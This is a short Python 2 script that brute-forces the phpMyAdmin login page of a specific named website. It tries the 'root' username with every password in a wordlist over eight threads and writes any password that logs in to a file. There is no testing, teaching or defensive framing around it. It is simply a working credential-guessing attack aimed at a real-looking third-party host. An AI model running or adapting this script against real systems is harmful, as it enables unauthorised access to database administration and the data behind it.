# -*- coding: utf-8 -*-
"""
__author__ = 'Langziyanqin'
__QQ__ = '982722261'
              ┏┓      ┏┓
            ┏┛┻━━━┛┻┓
            ┃      ☃      ┃
            ┃  ┳┛  ┗┳  ┃
            ┃      ┻      ┃
            ┗━┓      ┏━┛
                ┃      ┗━━━┓
                ┃  神兽保佑    ┣┓
                ┃　永无BUG！   ┏┛
                ┗┓┓┏━┳┓┏┛
                  ┃┫┫  ┃┫┫
                  ┗┻┛  ┗┻┛
"""
import sys
import requests
import re
from multiprocessing.dummy import Pool as ThreadPool
reload(sys)
sys.setdefaultencoding('utf-8')
url = 'http://www.yy-accp.com/phpmyadmin/index.php'
password = list(set([i.replace("\n","") for i in open("password.txt","r").readlines()]))
def scan(mima):
    data = {'pma_username': str('root'), 'pma_password': str(mima)}
    try:
        r = requests.post(url=url,data=data,timeout=10)
        print '---------------------------'
        print data
        print '----------------------------'
        if 'mainFrameset' in r.content:
            with open('success.txt','a+')as a:
                a.write(str(mima))
                return ''
        else:
            print r.status_code
    except Exception,e:
        print e
pool = ThreadPool(processes=8)
result = pool.map(scan, password)
pool.close()
pool.join()